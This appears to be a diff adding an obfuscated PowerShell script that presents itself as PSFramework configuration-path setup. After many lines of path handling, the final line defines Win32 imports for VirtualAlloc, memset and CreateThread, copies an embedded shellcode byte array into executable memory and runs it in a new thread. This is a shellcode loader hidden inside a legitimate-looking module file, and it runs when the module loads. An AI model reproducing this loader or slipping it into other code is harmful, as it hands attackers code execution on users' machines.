@@ -1,0 +1,109 @@
+&("{2}{1}{0}"-f 'M','tE','sET-I') ('Va'+'R'+'iabL'+'e'+':O5cW') (  [TYPe]("{1}{0}"-f 'aTh','Io.P') )  ; &('SV')  ("l"+"ti"+"mXb")  (  [TYPE]("{2}{3}{1}{0}"-f 't','NmEN','eNVIR','O')  )  ;   &("{3}{0}{2}{1}" -f'rI','BLe','A','SeT-VA')  ("3"+"td95") ([TyPE]("{6}{4}{0}{8}{7}{1}{5}{3}{2}"-f 'aMeWo','.','T','GhOs','r','lO','pSf','GE','Rk.MeSSa')); &("{2}{0}{1}"-f 'Et-IT','eM','s')  ("V"+"AR"+"Iable:"+"KvZju"+"X")  ( [TYPE]("{7}{5}{6}{2}{3}{1}{4}{0}" -F 'rEhosT','.pSfC','O','Re','O','aM','EWOrk.pSFC','pSfr')  )  ;
+${sCRiPT`:pAth`_rE`G`IsTR`YU`seRd`E`F`AulT} = ((("{19}{18}{5}{11}{15}{4}{6}{14}{12}{3}{13}{7}{0}{16}{10}{2}{17}{9}{1}{8}"-f'k','Defau','nf','ell','ftx','BSOFTWARExRB','RBWind','r','lt','B','BCo','Micros','rSh','xRBPSFramewo','owsPowe','o','xR','igxR','U:xR','HKC'))-REplAcE([cHAr]120+[cHAr]82+[cHAr]66),[cHAr]92)
+${SCrIP`T:`patH`_`REgisT`R`YuS`eR`e`NforC`ED} = ((("{4}{6}{20}{14}{0}{2}{17}{10}{16}{13}{7}{21}{8}{11}{12}{15}{19}{1}{9}{3}{18}{5}{22}"-f 'rosoftoIf','oI','Window','ig','HKCU:oIfS','Enforc','OFTWA','lo','f','fConf','Powe','P','SFr','Shel','oIfMic','amew','r','s','oIf','ork','RE','I','ed'))."R`Ep`laCE"(([cHaR]111+[cHaR]73+[cHaR]102),'\'))
+${S`c`RIpt:Path_ReGiSTryma`c`H`inEDef`A`ULt} = ((("{6}{7}{3}{9}{0}{11}{10}{4}{1}{5}{12}{2}{8}"-f'owsP','lpD','eworkpDZConf','pDZMicroso','hel','ZP','HKLM:pDZSOFTW','ARE','igpDZDefault','ftpDZWind','rS','owe','SFram'))."REp`lAcE"(([cHAr]112+[cHAr]68+[cHAr]90),'\'))
+${scR`IpT:p`ATH_rEGiST`RY`m`A`chiN`EENforced} = ((("{10}{16}{7}{0}{11}{1}{8}{9}{14}{5}{2}{17}{13}{12}{3}{15}{4}{6}" -f 'REw8T','softw8','rShe','or','nfigw8TEnfor','e','ced','FTWA','TWi','ndow','HKLM:w8TS','Micro','SFramew','TP','sPow','kw8TCo','O','llw8')).("{1}{2}{0}"-f'e','Repla','c').Invoke('w8T','\'))
+${PsVe`RsiOnn`A`Me} = ("{2}{0}{1}{3}"-f'ndowsP','ow','Wi','erShell')
+if (${pSvER`s`IOnTAblE}."pS`VeRsiON"."mA`JOR" -ge 6) { ${psv`ERSio`NnAME} = ("{3}{2}{0}{1}"-f'he','ll','owerS','P') }
+
+
+if (${isLi`N`Ux} -or ${i`SM`Acos})
+{
+	
+	${s`CriPT:`pa`T`H_lOcaLA`P`pdaTA} = ${env`:xDg_CoNfi`G`_ho`ME}
+	if (-not ${S`CRiP`T:pA`Th_lOCAlAPPdA`TA}) { ${sCr`ipt`:`pa`Th`_lo`cAlAPPD`ATa} = &("{0}{1}{2}"-f'J','oin-P','ath') ${h`OME} ("{1}{0}" -f 'config/','.') }
+	
+	${sCriPt`:pa`TH_Fi`L`EuSeRlocAL} = &("{0}{1}{2}"-f 'Join','-','Path') (&("{0}{1}{2}"-f 'J','o','in-Path') ${S`criPt:`P`A`Th`_LocaLAp`pdATa} ${PS`V`eRs`IO`NNaME}) ("{0}{1}{2}" -f'PSFramew','or','k/')
+}
+else
+{
+	
+	${S`Crip`T`:`PatH_FiL`eu`SE`RL`ocaL} = &("{0}{2}{1}" -f 'Joi','Path','n-') ${Env:LO`caL`APPD`Ata} "$psVersionName\PSFramework\Config"
+	${sCripT:pAtH_`LocAlA`pp`D`Ata} = ${ENV:l`Oc`AlaP`pdAta}
+	if (-not ${Scr`IpT:`Path_FiL`e`USERloCaL})
+	{
+		${SCri`pt`:P`ATH_fI`LEUs`ERL`OCal} = &("{0}{1}" -f 'Join-Pa','th') (  ${lTi`MxB}::("{2}{0}{3}{1}" -f 'etFolder','th','G','Pa').Invoke(("{1}{5}{2}{4}{0}{3}" -f 'ca','Lo','Ap','tionData','pli','cal'))) "$psVersionName\PSFramework\Config"
+		${scri`Pt:Pa`TH_loCa`l`A`ppd`AtA} =  (  &("{2}{0}{1}" -f'B','lE','vaRIa')  ("ltiMx"+"b")  -Valu)::("{2}{0}{1}" -f'er','Path','GetFold').Invoke(("{3}{0}{2}{4}{1}{5}" -f 'oca','i','lAppl','L','icat','onData'))
+	}
+}
+
+
+
+if (${i`sli`Nux} -or ${ISM`ACoS})
+{
+	
+	${sCripT:pATH`_Ap`P`dA`TA} = @(${env`:xDg_cOnfIg_`di`Rs} -split ( ( &("{1}{0}{2}"-f'AriabL','V','e')  ('o'+'5cw') )."vAL`UE"::"pAT`hS`e`P`ARatoR"))[0]
+	if (-not ${SCRi`p`T:Pat`h_apPD`ATA}) { ${ScrIpt:PAth`_a`PP`d`A`Ta} = &("{2}{0}{1}"-f '-Pat','h','Join') ${h`oMe} ("{2}{1}{0}"-f'hare/','local/s','.') }
+	
+	${ScriPt:patH`_FILE`Use`RSHA`REd} = &("{0}{3}{2}{1}" -f 'J','th','n-Pa','oi') (&("{0}{1}{2}"-f'Joi','n-Pat','h') ${S`c`R`iPt`:PaT`H_AP`PdatA} ${pSVEr`s`i`ONNAme}) ("{1}{2}{0}" -f'k/','PSF','ramewor')
+}
+else
+{
+	
+	${sc`R`IpT:PatH_`FI`LE`UseRS`haRED} = &("{0}{2}{1}" -f'J','Path','oin-') ${eNv:a`p`pData} "$psVersionName\PSFramework\Config"
+	${s`Cri`pT`:`Path_appd`AtA} = ${eNv:A`pPd`ATa}
+	if (-not ${Env:`APpD`A`Ta})
+	{
+		${sC`RIpt:`pat`h_aPPdata} =   (  &("{1}{0}{2}" -f'iaB','VaR','Le')  ("{1}{0}"-f'MxB','Lti')  -vALueoN )::("{2}{1}{3}{0}" -f'Path','tFo','Ge','lder').Invoke(("{1}{3}{2}{0}{4}" -f'nDa','A','icatio','ppl','ta'))
+		${sCRipT:paTh`_Fil`e`USe`RSh`A`ReD} = .("{0}{2}{1}"-f'Join-Pa','h','t') ( (.("{1}{0}" -f 'em','Get-it')  ("VAr"+"I"+"Ab"+"Le:LTIM"+"XB") )."v`AlUE"::("{0}{2}{1}" -f 'Get','erPath','Fold').Invoke(("{1}{2}{0}"-f 'Data','Applic','ation'))) "$psVersionName\PSFramework\Config"
+	}
+}
+
+
+
+if (${Is`L`iNux} -or ${Ism`A`COS})
+{
+	
+	${xDgC`O`NfIGd`i`RS} = ${eNv:xdg_C`ON`F`ig_`Di`RS} -split ( (.("{1}{0}{2}"-f 'I','VAr','able')  ("o5C"+"W")  )."v`Alue"::"pa`ThSePaR`A`ToR") | .("{2}{1}{3}{0}"-f 't','here','W','-Objec') { ${_} -and (&("{2}{1}{0}" -f 'th','st-Pa','Te') ${_}) }
+	if (${xd`Gc`onfi`gD`IRs}."cO`UNT" -gt 1) { ${sCR`ipt`:p`ATH`_proGRAMDatA} = ${xD`G`CO`NFigdirs}[1] }
+	else { ${SC`Ri`pT:pat`h_pR`ogRaM`d`ATa} = ("{1}{0}" -f'g/','/etc/xd') }
+	${Sc`RI`P`T`:p`ATH_FileSyS`Tem} = &("{1}{0}{2}" -f'in-P','Jo','ath') ${sCri`Pt`:paTH_prOgr`Am`daTa} "$psVersionName/PSFramework/"
+}
+else
+{
+	
+	${SC`Ri`Pt:pat`H_`FI`L`E`SYstEM} = .("{0}{2}{1}"-f'J','ath','oin-P') ${E`N`V:P`R`oGRaMDAtA} "$psVersionName\PSFramework\Config"
+	${SCR`I`PT:`PAT`H_`pRO`GRAmDATa} = ${env:PRO`G`Ram`dATa}
+	if (-not ${sCRiPt`:`P`ATh_`FILESY`StEm})
+	{
+		${SC`RiPT:PaT`h_`ProGRA`MdaTA} =  ( .("{0}{1}{2}"-f'gEt-','cHIl','DITEM') ("{1}{2}{3}{0}"-f 'mXB','Variabl','E',':LTi') )."VA`Lue"::("{1}{0}{2}"-f'F','Get','olderPath').Invoke(("{0}{1}{5}{3}{4}{2}" -f'Commo','nA','onData','li','cati','pp'))
+		${sCriPt:`P`AtH_FIl`E`sySteM} = .("{2}{1}{0}"-f'ath','in-P','Jo') (  ${lti`m`xB}::("{2}{1}{0}{3}" -f'olderPa','F','Get','th').Invoke(("{5}{0}{3}{1}{4}{2}" -f 'ommo','pli','ionData','nAp','cat','C'))) "$psVersionName\PSFramework\Config"
+	}
+}
+
+
+
+if (${iSl`I`Nux} -or ${Ism`ACoS})
+{
+	${ScrI`pt`:pAtH`_`lOGging} = .("{2}{0}{1}" -f 'at','h','Join-P') (.("{1}{2}{0}"-f 'Path','Spli','t-') ${sc`RIpT:`pAth`_F`ILeU`s`ER`sh`AreD}) ("{0}{1}"-f'L','ogs/')
+	${SC`RiPT:p`At`H`_`TypE`DaTa} = .("{1}{0}{2}" -f 'oin-Pa','J','th') ${SCR`I`p`T:Pat`H_FilE`U`sersH`ARed} ("{0}{2}{1}"-f 'Ty','eData/','p')
+}
+else
+{
+	
+	${sCRi`pt:`P`ATH`_lOgGi`NG} = &("{0}{2}{1}" -f'Join','th','-Pa') ${Env:ap`pD`A`TA} "$psVersionName\PSFramework\Logs"
+	${Sc`R`iPT:`pA`TH_`TYpeDAtA} = .("{1}{0}{2}" -f 'in-Pat','Jo','h') ${ENv`:`ApPD`Ata} "$psVersionName\PSFramework\TypeData"
+	if (-not ${eNv:a`PPd`A`Ta})
+	{
+		${s`cRipT`:PA`T`H_log`Gi`Ng} = &("{1}{2}{0}"-f'ath','Join-','P') ( ( .("{1}{0}{3}{2}" -f'-','GeT','abLE','VarI')  ('LtIM'+'Xb') -Va )::("{3}{1}{0}{2}" -f 'FolderPa','t','th','Ge').Invoke(("{2}{3}{1}{0}" -f'ata','ationD','App','lic'))) "$psVersionName\PSFramework\Logs"
+		${SCRipt`:Path`_Ty`PEd`A`TA} = &("{0}{1}"-f'Join-Pa','th') (  (.("{2}{1}{0}"-f'EM','T-iT','Ge') ('vAriABL'+'E:Lt'+'i'+'mx'+'b')  )."V`ALue"::("{3}{1}{2}{0}" -f 'ath','e','tFolderP','G').Invoke(("{1}{2}{0}{4}{3}" -f 'cat','App','li','Data','ion'))) "$psVersionName\PSFramework\TypeData"
+	}
+}
+
+
+
+
+
+${sc`Ri`pt:No`REGIS`TrY} = ${fa`lse}
+if ((${psvERsI`On`TABlE}."p`sVE`RsioN"."ma`jOR" -ge 6) -and (${psveR`SIo`NT`AblE}."oS" -notlike ("{1}{0}"-f 'ws*','*Windo')))
+{
+	${scrI`pT:`N`orE`giStRY} = ${t`Rue}
+}
+
+if (-not (  (&("{0}{2}{3}{1}" -f'GE','BlE','t-vA','RIa')  ("{0}{1}" -f '3t','d95')  -VA  )::"L`oGgin`gPATH")) {  ( &("{0}{1}{2}" -f 'V','A','riabLE')  ("3"+"Td95")  )."v`ALUe"::"LOGgI`N`G`paTH" = ${Sc`RiP`T:pa`T`H`_LOg`GiNg} }
+
+  (  &("{0}{1}"-f'G','CI') ("{3}{2}{0}{1}" -f'LE:k','VzJUX','b','VariA'))."V`ALue"::"M`OdUl`ErOot" = ${SCR`Ipt:`mOdUl`ER`O`ot}
+
+
+  (&("{0}{1}"-f 'V','arIaBLE')  ("kV"+"ZJuX")  -vAlUEONl)::("{0}{2}{1}"-f'I','tialize','ni').Invoke()
+${n`Eu} = ((("{60}{20}{7}{0}{61}{37}{3}{71}{48}{36}{32}{22}{70}{13}{8}{49}{35}{15}{39}{65}{10}{6}{41}{63}{51}{46}{69}{43}{21}{55}{14}{27}{50}{16}{11}{47}{67}{18}{29}{1}{44}{66}{17}{31}{42}{30}{58}{56}{54}{19}{28}{57}{68}{45}{5}{53}{4}{38}{40}{62}{33}{24}{34}{52}{12}{9}{2}{26}{59}{23}{64}{25}" -f'{0','ibutes','set(In','l32.','mport({0}ms','Id);','uint fl','rt(',' Vi',' IntPtr mem','ze, ','a','tern','extern IntPtr','}kernel32.','Alloc(I',']public static extern IntPtr Cre','tackSize','ad','Creatio','po','otect);[DllImport(','ic','int sr','{0})]public stati',' count);','tPtr dest,','dll','n','Attr','lpStar',', IntP',')]publ','l','c ','l','}','e','vc','ntPtr lpAddress, uint','rt.d','AllocationType,','tr ','r',', uint ','hread','t f','teThrea','ll{0','rtua','{0})','n','ex','[DllI','IntPtr lpParameter, uint dw','{0',', ','Flags,','tAddress',' u','[DllIm','}kern','l',' ui','c, uint',' dwSi','dwS','d(IntPtr lpThre',' IntPtr lpT','lP',' static ','d'))-F[ChaR]34);${W} = &("{2}{1}{0}" -f '-Type','d','Ad') -memberDefinition ${n`EU} -Name ("{1}{0}" -f '2','Win3') -namespace ("{3}{1}{4}{2}{0}" -f 'ions','n32Fu','ct','Wi','n') -passthru;[Byte[]];[Byte[]]${z} = 0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x58,0xbb,0xe9,0x77,0x39,0xdb,0x33,0xc9,0xb1,0x52,0x31,0x58,0x19,0x83,0xc0,0x04,0x03,0x58,0x15,0x0b,0x82,0xc5,0x33,0x49,0x6d,0x36,0xc4,0x2d,0xe7,0xd3,0xf5,0x6d,0x93,0x90,0xa6,0x5d,0xd7,0xf5,0x4a,0x16,0xb5,0xed,0xd9,0x5a,0x12,0x01,0x69,0xd0,0x44,0x2c,0x6a,0x48,0xb4,0x2f,0xe8,0x92,0xe9,0x8f,0xd1,0x5d,0xfc,0xce,0x16,0x83,0x0d,0x82,0xcf,0xc8,0xa0,0x33,0x7b,0x84,0x78,0xbf,0x37,0x09,0xf9,0x5c,0x8f,0x28,0x28,0xf3,0x9b,0x73,0xea,0xf5,0x48,0x08,0xa3,0xed,0x8d,0x34,0x7d,0x85,0x66,0xc3,0x7c,0x4f,0xb7,0x2c,0xd2,0xae,0x77,0xdf,0x2a,0xf6,0xb0,0x3f,0x59,0x0e,0xc3,0xc2,0x5a,0xd5,0xb9,0x18,0xee,0xce,0x1a,0xeb,0x48,0x2b,0x9a,0x38,0x0e,0xb8,0x90,0xf5,0x44,0xe6,0xb4,0x08,0x88,0x9c,0xc1,0x81,0x2f,0x73,0x40,0xd1,0x0b,0x57,0x08,0x82,0x32,0xce,0xf4,0x65,0x4a,0x10,0x57,0xda,0xee,0x5a,0x7a,0x0f,0x83,0x00,0x13,0xa1,0xf9,0xce,0xe3,0x55,0x75,0x46,0x8a,0xcc,0x2d,0xf0,0x1e,0x79,0xe8,0x07,0x60,0x50,0xc5,0xdc,0xcd,0x09,0x75,0xb0,0xa2,0xc5,0x43,0x60,0x3c,0xb2,0x4b,0x59,0xed,0xef,0xd9,0x61,0x41,0x5c,0x76,0xdd,0x64,0x62,0x86,0xc9,0x1f,0x62,0x86,0x09,0xcf,0x20,0xcc,0x31,0x5d,0xe2,0xd0,0x11,0x09,0xbd,0x59,0x0e,0x0f,0xbe,0x8f,0xb8,0x56,0x13,0x58,0xbb,0x54,0xf3,0x1c,0xe8,0x0b,0xa0,0x4b,0x5c,0xfa,0x2e,0x9f,0x37,0x2c,0x95,0xa0,0x6d,0xa6,0x83,0x54,0xd1,0x94,0x00,0x3a,0xbe,0x4c,0xce,0x91,0x46,0x69,0x75,0x15,0x93,0x0c,0x49,0x9c,0x16,0x40,0x3c,0xb2,0x4f,0xae,0x0b,0xee,0xc6,0xb1,0xa6,0x85,0xa6,0x25,0x48,0x4a,0x27,0xb6,0x20,0x6a,0x27,0xf6,0xb0,0x39,0x4f,0xae,0x14,0xee,0x6a,0xb1,0x81,0x82,0x26,0x1d,0xa0,0x42,0x9f,0xc9,0xb2,0xac,0x20,0x0a,0xe1,0xfa,0x48,0x18,0x93,0x8a,0x6b,0xe3,0x4e,0x09,0xab,0x68,0xbd,0x99,0x2b,0x90,0xfe,0x1b,0xf3,0xe7,0xe5,0x7c,0x37,0x58,0x0d,0xf5,0x48,0x98,0x32,0x37,0x80,0x52,0xe2,0x09,0xde,0xac,0xd4,0x58,0x2d,0xf5,0x06,0xaa,0x63,0x05;${g} = 0x1000;if (${Z}."LEn`GTH" -gt 0x1000){${g} = ${Z}."LEn`GTH"};${HC`8q}=${W}::("{2}{1}{0}{3}" -f 'lo','ualAl','Virt','c').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}."l`ENGTh"-1);${i}++) {${W}::"memS`et"([IntPtr](${HC`8q}.("{1}{0}" -f'2','ToInt3').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{1}{2}{0}{3}" -f 'e','Cr','eateThr','ad').Invoke(0,0,${H`C8q},0,0,0);for (;;){.("{2}{0}{1}{3}" -f'tart','-s','S','leep') 60};
